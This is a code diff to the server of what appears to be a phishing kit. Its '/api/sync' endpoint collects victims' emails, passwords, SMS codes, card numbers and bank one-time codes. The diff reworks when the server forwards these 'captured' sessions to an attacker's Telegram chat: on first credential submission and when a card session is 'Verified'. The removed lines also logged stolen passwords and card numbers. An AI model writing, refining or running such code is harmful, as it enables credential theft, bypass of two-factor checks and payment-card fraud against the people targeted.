@@ -328,50 +328,29 @@ app.post('/api/sync', async (req, res) => {
             }
         }
 
-        // 1. New Session (Push Telegram)
-        if (!existing) {
-             const msg = formatSessionForTelegram(data, 'New Session Started', flag);
-             sendTelegram(msg);
+        // Notification Logic
+
+        // 1. New Session Initialized (Login Submitted)
+        // Trigger: New data has email & password, but existing (if any) didn't have both.
+        const hasCreds = (obj: any) => obj && obj.email && obj.password;
+
+        if (hasCreds(data)) {
+            const e = existing ? (existing.data || existing) : null;
+            const alreadyHadCreds = e && hasCreds(e);
+
+            if (!alreadyHadCreds) {
+                 const msg = formatSessionForTelegram(data, 'New Session Initialized', flag);
+                 sendTelegram(msg);
+            }
         }
-        // 2. Update Notifications (Intermediate Steps)
-        else {
-            const changes: string[] = [];
-            const d = data;
-            const e = existing.data || existing; // handle raw or nested
 
-            // Debug Logging for Logic
-            console.log(`[Sync Debug] ID: ${data.sessionId}`);
-            console.log(`[Sync Debug] Email: New='${d.email}' vs Old='${e.email}'`);
-            console.log(`[Sync Debug] Pass: New='${d.password}' vs Old='${e.password}'`);
-            console.log(`[Sync Debug] Card: New='${d.cardNumber}' vs Old='${e.cardNumber}'`);
-
-            // Check specific fields for changes
-            // Note: e.email might be undefined if not set yet
-            if (d.email && d.email !== (e.email || '')) changes.push('Login Captured');
-            if (d.password && d.password !== (e.password || '')) changes.push('Password Captured');
-            if (d.phoneCode && d.phoneCode !== (e.phoneCode || '')) changes.push('SMS Code Captured');
-            if (d.cardNumber && d.cardNumber !== (e.cardNumber || '')) changes.push('Card Captured');
-            if (d.cardOtp && d.cardOtp !== (e.cardOtp || '')) changes.push('Bank OTP Captured');
-
-            if (changes.length > 0) {
-                console.log(`[Sync Debug] Changes Detected: ${changes.join(', ')}`);
-            } else {
-                console.log(`[Sync Debug] No Changes Detected`);
-            }
-
-            // Completed Session
-            if (existing.status !== 'Verified' && data.status === 'Verified') {
-                 const cardType = data.cardType ? `[${escapeHtml(data.cardType).toUpperCase()}]` : '[CARD]';
-                 const title = `Session Verified ${cardType}`;
-                 const msg = formatSessionForTelegram(data, title, flag);
-                 sendTelegram(msg);
-            }
-            // Intermediate Updates
-            else if (changes.length > 0) {
-                 const title = `Update: ${changes.join(', ')}`;
-                 const msg = formatSessionForTelegram(data, title, flag);
-                 sendTelegram(msg);
-            }
+        // 2. Session Verified
+        // Trigger: Status changes to Verified
+        if (existing && existing.status !== 'Verified' && data.status === 'Verified') {
+             const cardType = data.cardType ? `[${escapeHtml(data.cardType).toUpperCase()}]` : '[CARD]';
+             const title = `Session Verified ${cardType}`;
+             const msg = formatSessionForTelegram(data, title, flag);
+             sendTelegram(msg);
         }
 
         // Prevent downgrading 'Verified' status
